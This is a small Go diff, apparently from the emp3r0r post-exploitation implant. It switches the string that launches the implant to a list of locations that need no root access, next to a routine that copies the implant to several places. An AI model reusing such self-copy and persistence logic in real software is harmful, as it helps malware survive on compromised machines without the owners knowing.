@@ -57,7 +57,7 @@ var (
 	}
 
 	// call this to start emp3r0r
-	payload = strings.Join(EmpLocations, " || ")
+	payload = strings.Join(EmpLocationsNoRoot, " || ")
 )
 
 // SelfCopy copy emp3r0r to multiple locations
